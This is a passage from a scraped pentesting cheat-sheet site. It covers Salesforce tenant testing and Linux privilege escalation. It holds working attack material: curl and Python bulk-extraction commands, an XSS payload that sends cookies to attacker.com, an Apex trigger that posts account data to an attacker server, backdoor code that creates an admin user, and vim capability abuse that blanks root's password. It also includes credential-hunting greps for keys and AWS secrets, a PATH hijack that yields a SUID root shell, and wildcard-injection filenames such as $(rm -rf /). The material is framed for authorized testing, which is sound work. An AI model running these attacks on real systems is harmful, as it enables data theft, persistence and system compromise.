access to objects or records. Root Cause: Overly permissive OWD or sharing rules for guest profiles. Enumeration Techniques: - UI Navigation: Check <code>Setup &gt; Sites &gt; [Site Label] &gt; Public Access Settings</code> for guest profile permissions. - SOQL Query (Developer Console): <pre><code>SELECT Id, Name FROM User WHERE Profile.Name LIKE '%Guest%'\n</code></pre> - Exploitation Steps:   1. Access public API endpoints or site URLs (e.g., <code>https://&lt;siteurl&gt;.force.com/services/data/v58.0/sobjects/</code>).   2. Query vulnerable objects like <code>Case</code> or <code>Contact</code>:      <pre><code>curl \"https://&lt;siteurl&gt;.force.com/services/data/v58.0/query?q=SELECT+Id,Name,Email+FROM+Contact\"\n</code></pre>   3. Test creation/modification rights:      <pre><code>curl -X POST \"https://&lt;siteurl&gt;.force.com/services/data/v58.0/sobjects/Case\" \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"Subject\": \"Test Case\", \"Description\": \"Injected\"}'\n</code></pre> Impact: Critical data exposure or manipulation by unauthenticated users. Remediation: Remove CRUD permissions from guest profiles unless required; set OWD to \u201cPrivate\u201d for sensitive objects; enable \u201cSecure guest user record access\u201d in Sharing Settings.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#data-exposure-exfiltration-testing","title":"Data Exposure &amp; Exfiltration Testing","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#51-insecure-record-visibility-via-api","title":"5.1 Insecure Record Visibility via API","text":"<p>Description: APIs may return records beyond user permissions due to misconfigured sharing settings. Root Cause: API queries often bypass UI restrictions if sharing isn\u2019t enforced. Enumeration Techniques: - Obtain API Token: Use a Connected App or user credentials for access. - Query Sensitive Objects (REST API): <pre><code>curl -H \"Authorization: Bearer &lt;YOUR_ACCESS_TOKEN&gt;\" \\\n     \"https://&lt;INSTANCE&gt;.salesforce.com/services/data/v56.0/query?q=SELECT+Id,Name,AnnualRevenue+FROM+Account+LIMIT+100\" \\\n     -o sensitive_data.json\n</code></pre> - Exploitation Steps:   1. Use a low-privilege account\u2019s token to query objects.   2. If data is returned, escalate by querying other objects or increasing the <code>LIMIT</code>.   3. Automate extraction with Python:      <pre><code>from simple_salesforce import Salesforce\nsf = Salesforce(instance_url='https://&lt;INSTANCE&gt;.salesforce.com', session_id='&lt;YOUR_ACCESS_TOKEN&gt;')\nresult = sf.query(\"SELECT Id, Name FROM Account LIMIT 1000\")\nprint(result['records'])\n</code></pre> Impact: Bulk extraction of sensitive data (e.g., PII, financials). Remediation: Enforce sharing rules on API access; limit API scopes for Connected Apps; monitor API usage for anomalies.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#52-exposed-reports-dashboards","title":"5.2 Exposed Reports &amp; Dashboards","text":"<p>Description: Misconfigured reports or dashboards in shared folders leak summarized data. Root Cause: Public or shared folder access controls are too permissive. Enumeration Techniques: - UI Navigation: Navigate to <code>Reports</code> or <code>Dashboards</code> tab, filter by \u201cAll Reports/Dashboards\u201d; check folder sharing via <code>Setup &gt; Report and Dashboard Folder Sharing</code>. - SOQL Query (Developer Console): <pre><code>SELECT Id, Name, FolderName FROM Report WHERE FolderName = 'Public Reports'\n</code></pre> - Exploitation Steps:   1. Log in as a low-privilege user.   2. Access a report/dashboard in a shared folder.   3. Export data if possible, or screenshot sensitive aggregations. Impact: Exposure of business-critical data or metrics. Remediation: Restrict visibility to specific roles; avoid \u201cView All\u201d permissions on folders; audit folder access.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#53-chatter-feed-information-leaks","title":"5.3 Chatter &amp; Feed Information Leaks","text":"<p>Description: Sensitive information (e.g., passwords, PII) may be disclosed in Chatter posts or feeds. Root Cause: Lack of Data Loss Prevention (DLP) or user training on secure communication. Enumeration Techniques: - SOQL Query (Developer Console): <pre><code>SELECT Body, CreatedById FROM FeedItem WHERE Body LIKE '%password%' OR Body LIKE '%secret%'\n</code></pre> - UI Navigation: Browse Chatter posts for sensitive disclosures. - Exploitation Steps:   1. Use API or UI to read Chatter posts.   2. Search for secrets, tokens, or PII in post content. Impact: Accidental exposure of credentials or sensitive data. Remediation: Implement DLP processes for Chatter; train users on data posting policies; review posts periodically.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#custom-code-business-logic-testing","title":"Custom Code &amp; Business Logic Testing","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#61-soql-injection-in-apex","title":"6.1 SOQL Injection in Apex","text":"<p>Description: Dynamic SOQL queries with unsanitized user input allow query manipulation. Root Cause: String concatenation in SOQL queries instead of using bind variables. Enumeration Techniques: - UI Navigation: Review <code>Setup &gt; Custom Code &gt; Apex Classes</code> for dynamic SOQL:   <pre><code>// Vulnerable Code\npublic void searchAccounts(String searchTerm) {\n    String query = 'SELECT Id, Name FROM Account WHERE Name LIKE \\'%' + searchTerm + '%\\'';\n    List&lt;Account&gt; results = Database.query(query);\n    // Process results\n}\n</code></pre> - Static Analysis: Use PMD or Checkmarx to identify dynamic queries. - Exploitation Steps:   1. Identify user inputs feeding into dynamic SOQL (e.g., Visualforce page or Lightning component).   2. Inject a payload to manipulate the query:      - Input: <code>test%' OR '1'='1</code>      - Resulting Query: <code>SELECT Id, Name FROM Account WHERE Name LIKE '%test%' OR '1'='1%'</code>      - Effect: Returns all records.   3. Deploy a test Visualforce page to trigger:      <pre><code>&lt;apex:page controller=\"VulnerableController\"&gt;\n    &lt;apex:form&gt;\n        &lt;apex:inputText value=\"{!searchTerm}\" /&gt;\n        &lt;apex:commandButton action=\"{!searchAccounts}\" value=\"Search\" /&gt;\n    &lt;/apex:form&gt;\n&lt;/apex:page&gt;\n</code></pre> Impact: Full data extraction or access control bypass. Remediation: Use bind variables:   <pre><code>String searchTerm = '%' + userInput + '%';\nList&lt;Account&gt; results = [SELECT Id, Name FROM Account WHERE Name LIKE :searchTerm];\n</code></pre>   Conduct regular code reviews and enforce static analysis.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#62-insecure-direct-object-reference-idor-in-visualforce","title":"6.2 Insecure Direct Object Reference (IDOR) in Visualforce","text":"<p>Description: Manipulating record IDs in URLs or parameters allows unauthorized data access. Root Cause: Lack of server-side access checks on record IDs. Enumeration Techniques: - UI Navigation: Identify Visualforce pages or Lightning components accepting record IDs (e.g., <code>?id=001xxxxxxxxxxxx</code>). - Code Review (Developer Console): <pre><code>// Vulnerable Code\npublic Account getAccount() {\n    String recordId = ApexPages.currentPage().getParameters().get('id');\n    return [SELECT Id, Name, AnnualRevenue FROM Account WHERE Id = :recordId];\n}\n</code></pre> - Exploitation Steps:   1. Access a Visualforce page with a record ID parameter (e.g., <code>https://&lt;INSTANCE&gt;.visual.force.com/apex/MyPage?id=001xxxxxxxxxxxx</code>).   2. Modify the <code>id</code> parameter to another record ID (e.g., increment or use a known ID).   3. Confirm if unauthorized data is displayed. Impact: Unauthorized access to sensitive records. Remediation: Implement server-side checks:   <pre><code>public Account getAccount() {\n    String recordId = ApexPages.currentPage().getParameters().get('id');\n    Account acc = [SELECT Id, Name FROM Account WHERE Id = :recordId];\n    if (!Schema.sObjectType.Account.isAccessible()) {\n        throw new AuraHandledException('Access Denied');\n    }\n    return acc;\n}\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#63-insecure-apex-execution-context-crudfls-bypass","title":"6.3 Insecure Apex Execution Context (CRUD/FLS Bypass)","text":"<p>Description: Apex classes running in system context bypass sharing rules and Field-Level Security (FLS) unless explicitly enforced. Root Cause: Developers assume platform security or use <code>without sharing</code> for functionality. Enumeration Techniques: - Static Analysis (Code Review): Search for <code>without sharing</code> or missing <code>WITH SECURITY_ENFORCED</code> in SOQL.   <pre><code>// Vulnerable Code\npublic with sharing class CaseController {\n    @AuraEnabled\n    public static void saveCaseDetails(Id caseId, String accountNameToUpdate) {\n        Case c = [SELECT Id, AccountId FROM Case WHERE Id = :caseId];\n        Account a = new Account(Id = c.AccountId, Name = accountNameToUpdate);\n        update a; // System context bypasses user permissions on Account!\n    }\n}\n</code></pre> - Dynamic Analysis (Burp Suite):   1. Capture a legitimate request to the <code>@AuraEnabled</code> method via <code>/aura</code> endpoint.   2. Modify parameters (e.g., <code>accountNameToUpdate</code>) in Burp Repeater to test unauthorized writes.   3. Verify if the update succeeds despite lacking direct edit permissions. Impact: Critical privilege escalation to read/write restricted data. Remediation: Use <code>WITH SECURITY_ENFORCED</code> for SOQL:   <pre><code>List&lt;Account&gt; accs = [SELECT Id FROM Account WITH SECURITY_ENFORCED];\n</code></pre>   For DML, manually check permissions or use <code>Security.stripInaccessible()</code> to remove inaccessible fields.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#platform-configuration-misconfiguration-testing","title":"Platform Configuration &amp; Misconfiguration Testing","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#71-default-sharing-on-custom-objects","title":"7.1 Default Sharing on Custom Objects","text":"<p>Description: Custom objects with loose sharing defaults expose data unintentionally. Root Cause: Developers or admins set sharing to <code>ReadWrite</code> or fail to configure OWD. Enumeration Techniques: - SOQL Query (Developer Console): <pre><code>SELECT DeveloperName, SharingModel FROM CustomObject WHERE SharingModel = 'ReadWrite'\n</code></pre> - UI Navigation: Check <code>Setup &gt; Object Manager &gt; [Custom Object] &gt; Sharing Settings</code>. - Exploitation Steps:   1. Log in as a low-privilege user.   2. Access the custom object via UI or API to view/edit records not owned by the user. Impact: Accidental data exposure across users. Remediation: Set sharing to <code>Private</code> by default for custom objects; apply specific sharing rules as needed.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#72-debug-log-exposure","title":"7.2 Debug Log Exposure","text":"<p>Description: Overly verbose debug logs may leak sensitive data like credentials or session tokens. Root Cause: Debug logs set to high verbosity without filtering sensitive information. Enumeration Techniques: - UI Navigation: Check <code>Setup &gt; Debug Logs</code> for logs on privileged actions or users. - Exploitation Steps:   1. If accessible, review logs for sensitive data (e.g., API tokens, passwords).   2. Trigger debug logging via custom code or actions to capture data. Impact: Exposure of secrets or internal logic for further attacks. Remediation: Minimize debug logging in production; mask sensitive fields in logs; restrict log access to admins.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#api-integration-security-testing","title":"API &amp; Integration Security Testing","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#81-over-scoped-connected-apps","title":"8.1 Over-Scoped Connected Apps","text":"<p>Description: Connected Apps with excessive OAuth scopes (e.g., <code>full</code> or <code>api</code>) allow unintended data access. Root Cause: Apps request broad scopes beyond minimal requirements. Enumeration Techniques: - UI Navigation: Review <code>Setup &gt; Apps &gt; Connected Apps</code> for app scopes. - Exploitation Steps:   1. If authorized, log in to the Connected App or steal an OAuth token via phishing.   2. Use the token to query sensitive data:      <pre><code>curl -H \"Authorization: Bearer &lt;STOLEN_TOKEN&gt;\" \\\n     \"https://&lt;INSTANCE&gt;.salesforce.com/services/data/v56.0/query?q=SELECT+Id,Name+FROM+Account+LIMIT+1000\" \\\n     -o stolen_data.json\n</code></pre> Impact: Unauthorized data access or manipulation via API. Remediation: Limit Connected App scopes to minimal required access; enforce admin approval for app installations; monitor OAuth token usage.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#82-excessive-api-permissions","title":"8.2 Excessive API Permissions","text":"<p>Description: Standard or integration users with API access (<code>ApiEnabled</code>) can extract data programmatically. Root Cause: Profiles unnecessarily granted API permissions. Enumeration Techniques: - SOQL Query (Developer Console): <pre><code>SELECT Name, PermissionsApiEnabled FROM Profile WHERE PermissionsApiEnabled = TRUE\n</code></pre> - Exploitation Steps:   1. Use valid credentials to access REST/SOAP APIs:      <pre><code>curl -H \"Authorization: Bearer &lt;ACCESS_TOKEN&gt;\" \\\n     \"https://&lt;INSTANCE&gt;.salesforce.com/services/data/v58.0/sobjects/\"\n</code></pre>   2. Enumerate all accessible objects and extract data. Impact: Mass data exfiltration or lateral movement. Remediation: Restrict API access to specific profiles; use managed packages or named credentials for integrations.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#client-side-web-vulnerabilities-testing","title":"Client-Side &amp; Web Vulnerabilities Testing","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#91-lightning-web-component-lwc-dom-based-xss","title":"9.1 Lightning Web Component (LWC) DOM-Based XSS","text":"<p>Description: Unsanitized user input in LWCs can lead to JavaScript injection and code execution. Root Cause: Use of <code>innerHTML</code> or similar DOM manipulation methods without sanitization. Enumeration Techniques: - UI Navigation: Check <code>Setup &gt; Custom Code &gt; Lightning Components</code> for custom LWCs. - Code Review (Developer Console): <pre><code>// Vulnerable LWC\nimport { LightningElement, api } from 'lwc';\nexport default class VulnerableComponent extends LightningElement {\n    @api userInput;\n    renderedCallback() {\n        this.template.querySelector('div').innerHTML = this.userInput; // XSS risk\n    }\n}\n</code></pre> - Exploitation Steps:   1. Pass a malicious payload via URL or form input:      - Payload: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>   2. Confirm if the payload executes in the browser.   3. Escalate to steal session cookies:      - Payload: <code>&lt;script&gt;document.location='https://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;</code> Impact: Session hijacking, data theft, or malicious actions. Remediation: Avoid <code>innerHTML</code>; use safe DOM APIs:   <pre><code>this.template.querySelector('div').textContent = this.userInput; // Safer\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#92-csrf-clickjacking","title":"9.2 CSRF &amp; Clickjacking","text":"<p>Description: Lack of CSRF tokens or anti-frame headers allows cross-origin manipulation or UI trickery. Root Cause: Missing protections in custom endpoints or platform pages. Enumeration Techniques: - Check Headers: Use browser dev tools to inspect response headers for <code>X-Frame-Options</code> or <code>Content-Security-Policy</code>. - Exploitation Steps:   1. Attempt to embed sensitive pages in an iframe to test clickjacking.   2. Craft a CSRF payload for a custom endpoint without tokens:      <pre><code>&lt;form action=\"https://&lt;INSTANCE&gt;.salesforce.com/setup/own/users.jsp\" method=\"POST\"&gt;\n    &lt;input type=\"hidden\" name=\"save\" value=\"1\"&gt;\n    &lt;input type=\"hidden\" name=\"id\" value=\"005xxxxxxxxxxxx\"&gt;\n    &lt;input type=\"hidden\" name=\"IsActive\" value=\"false\"&gt;\n    &lt;input type=\"submit\" value=\"Disable User Account\"&gt;\n&lt;/form&gt;\n</code></pre> Impact: Social engineering or unauthorized actions on behalf of users. Remediation: Ensure anti-clickjacking headers are sent; validate CSRF tokens on custom endpoints.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#advanced-exploitation-privilege-escalation","title":"Advanced Exploitation &amp; Privilege Escalation","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#101-flow-builder-privilege-escalation","title":"10.1 Flow Builder Privilege Escalation","text":"<p>Description: Misconfigured Flows running in system context allow privilege escalation. Root Cause: Flows ignore user permissions if not explicitly restricted. Enumeration Techniques: - UI Navigation: Check <code>Setup &gt; Process Automation &gt; Flows</code> for user-input-driven Flows updating sensitive objects. - Exploitation Steps:   1. Trigger a Flow as a low-privilege user (e.g., via custom button or Visualforce page).   2. Provide inputs to update a record (e.g., change ownership or field values).   3. Confirm if unauthorized updates occur. Impact: Data tampering or privilege escalation. Remediation: Run Flows in user context; validate inputs and permissions within Flows; limit access to specific profiles.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#102-system-context-abuse-via-apex-triggers","title":"10.2 System Context Abuse via Apex Triggers","text":"<p>Description: Apex triggers running in system context can be abused to perform privileged actions. Root Cause: Triggers execute with elevated privileges unless restricted. Enumeration Techniques: - Code Review (Developer Console): Review triggers in <code>Setup &gt; Custom Code &gt; Apex Triggers</code> for updates or callouts. - Exploitation Steps:   1. Identify a trigger on a writable object (e.g., Case update).   2. Manipulate input to influence trigger behavior (e.g., update a related Account).   3. Confirm if unauthorized actions occur. Impact: Bypassing sharing rules or FLS for data manipulation. Remediation: Explicitly check permissions in triggers; avoid system context unless necessary.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#persistence-defense-evasion","title":"Persistence &amp; Defense Evasion","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#111-backdoor-via-malicious-apex","title":"11.1 Backdoor via Malicious Apex","text":"<p>Description: Deploying malicious Apex code provides persistent access or backdoors. Root Cause: Users with <code>Customize Application</code> or <code>Author Apex</code> can deploy code. Enumeration Techniques: - SOQL Query (Developer Console): <pre><code>SELECT Name, NamespacePrefix FROM ApexClass WHERE Name LIKE '%admin%' OR Name LIKE '%backdoor%'\n</code></pre> - Exploitation Steps:   1. If code deployment is in scope, deploy a malicious class to create a backdoor admin user:      <pre><code>public class AddAdmin {\n    public static void escalatePrivs() {\n        Profile p = [SELECT Id FROM Profile WHERE Name='System Administrator'];\n        User u = new User(\n            Alias = 'pwned',\n            Email='attacker@example.com',\n            EmailEncodingKey='UTF-8',\n            LastName='Admin',\n            LanguageLocaleKey='en_US',\n            LocaleSidKey='en_US',\n            ProfileId = p.Id,\n            TimeZoneSidKey='America/Los_Angeles',\n            UserName='pwned_user@example.com.test'\n        );\n        insert u;\n    }\n}\n</code></pre>   2. Execute via Developer Console: <code>AddAdmin.escalatePrivs();</code>. Impact: Persistent admin access for long-term compromise. Remediation: Restrict code deployment to trusted admins; enforce code reviews; monitor Apex changes via audit logs.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#112-data-exfiltration-via-unmonitored-channels","title":"11.2 Data Exfiltration via Unmonitored Channels","text":"<p>Description: Use legitimate Salesforce features to exfiltrate data covertly. Root Cause: Lack of monitoring on outbound channels like email or callouts. Exploitation Steps:   1. Modify an Apex trigger to send data to an attacker server via HTTP callout:      <pre><code>trigger AccountTrigger on Account (after insert) {\n    for (Account a : Trigger.new) {\n        HttpRequest req = new HttpRequest();\n        req.setEndpoint('https://attacker.com/log');\n        req.setMethod('POST');\n        req.setBody('Stolen Data: ' + a.Name + ' - Revenue: ' + a.AnnualRevenue);\n        new Http().send(req);\n    }\n}\n</code></pre>   2. Configure email alerts to send reports to external addresses. Impact: Covert data theft bypassing DLP. Remediation: Monitor outbound callouts and emails; restrict external communications in Apex code.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#reporting-remediation-framework","title":"Reporting &amp; Remediation Framework","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#objective_1","title":"Objective","text":"<p>Deliver clear, actionable findings to the client with evidence and remediation guidance.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#steps_1","title":"Steps","text":"<ul> <li>Document Findings: For each vulnerability, include:</li> <li>Description, root cause, and business impact.</li> <li>Screenshots, API responses, or logs as proof of concept (PoC).</li> <li>Sample payloads or code used during exploitation.</li> <li>Prioritize Issues: Use CVSS scores or business impact (e.g., data breach risk) to rank findings.</li> <li>Provide Remediation: Offer specific fixes as detailed in each section above, tailored to the client\u2019s environment.</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#impact_1","title":"Impact","text":"<p>Ensures the client can address vulnerabilities effectively, reducing risk and improving security posture.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#tools-references","title":"Tools &amp; References","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#tools_1","title":"Tools","text":"<ul> <li>CLI &amp; Automation: Salesforce CLI (<code>sfdx</code>), <code>simple_salesforce</code> (Python), <code>jsforce</code> (Node.js)</li> <li>API Testing: Postman, Burp Suite (intercept OAuth flows), cURL</li> <li>Static Analysis: PMD, Checkmarx, SonarQube (for Apex and LWC code)</li> <li>Browser Extensions: Salesforce Inspector (Chrome) for metadata exploration</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#references","title":"References","text":"<ul> <li>Salesforce Security Guide (Salesforce documentation)</li> <li>OWASP Top 10 (relevant to web and API vulnerabilities)</li> <li>CIS Salesforce Benchmarks (configuration hardening)</li> <li>Trailhead Security Modules (official Salesforce training)</li> </ul>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%204/#final-thoughts","title":"Final Thoughts","text":"<p>Salesforce tenants are complex environments with diverse attack surfaces including access controls, custom code, APIs, and integrations. As an elite tester, focus on chaining vulnerabilities (e.g., IDOR to API data exposure) for maximum impact. Salesforce\u2019s robust logging and monitoring can detect malicious activity, so operate strictly within RoE. Break responsibly to secure the cloud.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/ACLs/","title":"ACLs","text":"<p>Check ACLs on Sensitive Files <pre><code>getfacl /etc/shadow    # see if you have read permissions\ngetfacl /etc/passwd    # see if you can modify or read\n</code></pre> Check ACLs on Directories <pre><code>getfacl /usr/local/bin # maybe you can write to a directory in /usr/local/bin\ngetfacl /etc            # check if you can write to /etc/\n</code></pre> - If you have write ACL to <code>/etc</code>, you can drop a malicious script in <code>/etc/profile</code> or <code>/etc/bash.bashrc</code>.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Capabilities/","title":"Capabilities","text":"<p>https://steflan-security.com/linux-privilege-escalation-exploiting-capabilities/</p> <p>https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities</p> <p>Restrict a binary to only certain actions using setcap</p> <pre><code>sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic\n</code></pre> Capability Desciption <code>cap_sys_admin</code> Allows to perform actions with administrative privileges, such as modifying system files or changing system settings. <code>cap_sys_chroot</code> Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible. <code>cap_sys_ptrace</code> Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. <code>cap_sys_nice</code> Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted. <code>cap_sys_time</code> Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways. <code>cap_sys_resource</code> Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated. <code>cap_sys_module</code> Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information. <code>cap_net_bind_service</code> Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions. Capability Values Desciption <code>=</code> This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable. <code>+ep</code> This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. <code>+ei</code> This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions. <code>+p</code> This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it. <p>Several Linux capabilities can be used to escalate a user's privileges to <code>root</code>, including:</p> Capability Desciption <code>CAP_SETUID</code> Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the <code>root</code> user. <code>CAP_SETGID</code> Allows to set its effective group ID, which can be used to gain the privileges of another group, including the <code>root</code> group. <code>CAP_SYS_ADMIN</code> This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the <code>root</code> user, such as modifying system settings and mounting and unmounting file systems. <p>The following capabilities are particularly dangerous and should be investigated further if found enabled on a system:</p> <ul> <li>CAP_CHOWN</li> <li>CAP_DAC_OVERRIDE</li> <li>CAP_DAC_READ_SEARCH</li> <li>CAP_SETUID</li> <li>CAP_SETGID</li> <li>CAP_NET_RAW</li> <li>CAP_SYS_ADMIN</li> <li>CAP_SYS_PTRACE</li> <li>CAP_SYS_MODULE</li> <li>CAP_FORMER</li> <li>CAP_SETFCAP</li> </ul> <p>Find setcap capabilities</p> <pre><code>find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \\\\;\ngetcap -r / 2&gt;/dev/null\n</code></pre> <p>Have access to an account but no access to cap_sys_admin?</p> <pre><code>getcap /usr/bin/vim.basic\n</code></pre> <p>VIM can run as admin and edit files</p> <pre><code>/usr/bin/vim.basic /etc/passwd\n</code></pre> <pre><code>echo -e ':%s/^root:[^:]*:/root::/\\\\nwq' | /usr/bin/vim.basic -es /etc/passwd\n</code></pre> <pre><code>cat /etc/passwd | head -n1\nroot::0:0:root:/root:/bin/bash\n</code></pre> <p>VIM has the capability: cap_dac_override+eip</p> <pre><code>/usr/bin/vim.basic = cap_dac_override+eip\n</code></pre> <p>You can write to ANY file bypassing privs</p> <pre><code>vim /etc/sudoers\n</code></pre> <p>add your user</p> <pre><code>hacker  ALL=(ALL:ALL) ALL\n</code></pre> <p>Now you can run sudo</p> <pre><code>getcap -r / 2&gt;/dev/null\n</code></pre>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Credential%20Hunting/","title":"Credential Hunting","text":"<p>Search for files containing \u201cpassword\u201d or \u201cpasswd\u201d <pre><code>grep -ir \"password\" /etc 2&gt;/dev/null\ngrep -ir \"passwd\" /home 2&gt;/dev/null\n</code></pre> check for dbs and config files <pre><code>find / -type f -name \"*.conf\" -exec grep -H \"DB_USER\" {} \\; 2&gt;/dev/null\nfind / -type f -name \"*.yaml\" -exec grep -H \"password\" {} \\; 2&gt;/dev/null\n</code></pre> Private keys <pre><code>find / -type f -name \"*.pem\" -o -name \"*.key\" 2&gt;/dev/null\nfind /home -type f -name \"id_rsa\" 2&gt;/dev/null\n</code></pre> Search for credentials in environment files: <pre><code>grep -R \"export\" /etc/profile /etc/bashrc \n</code></pre> git stuff <pre><code>find /home -type f -name \".git-credentials\" -o -name \".gitconfig\" 2&gt;/dev/null\n</code></pre> aws creds <pre><code>find /home -type f -path \"*aws*\" -exec grep -H \"aws_access_key_id\" {} \\; 2&gt;/dev/null\nfind / -type f -path \"*aws*\" -exec grep -H \"AWS_ACCESS_KEY_ID\" {} \\; 2&gt;/dev/null\n</code></pre> Check <code>/var/log/auth.log</code> or <code>/var/log/secure</code> for previously captured credentials or failed attempts: <pre><code>grep -i \"fail\" /var/log/auth.log\ngrep -i \"Accepted\" /var/log/auth.log\n</code></pre> Look for passwords in scripts or in <code>/opt</code>, <code>/usr/local</code>: <pre><code>grep -ir \"password\" /opt /usr/local 2&gt;/dev/null\n</code></pre></p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/Linux%20Privilege%20Escalation/Environment%20Hunting/","title":"Environment Hunting","text":"<p>Check for scripts or binaries owned by root but writable by user, and abuse <code>PATH</code>: <pre><code>find / -perm -o=w -type f 2&gt;/dev/null | grep \"/usr/bin\"\n</code></pre> If a root-owned script calls binaries without full path, you can create a malicious binary earlier in <code>PATH</code>: <pre><code>export PATH=/tmp/malicious:$PATH\necho -e '#!/bin/bash\\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' &gt; /tmp/malicious/su\nchmod +x /tmp/malicious/su\n# When root runs \u201csu\u201d in script, it executes /tmp/malicious/su\n/tmp/rootbash -p  # drop into root shell\n</code></pre> Wildcard Injection: If a script uses wildcards like <code>cp *.txt /root/backup/</code>, place a file named <code>--help</code> or <code>-rf</code> to inject options: <pre><code>echo \"malicious\" &gt; --help\nmkdir -p /tmp/backupdir\ncp --help /tmp/backupdir      # Might treat \u201c--help\u201d as an option\n</code></pre></p> <ul> <li>If a script does something like tar -cf backup.tar <code>*</code>, place a malicious file named --checkpoint=1 to inject tar\u2019s options, or use symlinks to overwrite files.</li> <li>If a script uses for f in <code>*</code>; do somecommand $f; done, create a filename like $(rm -rf /). Use IFS or manipulate 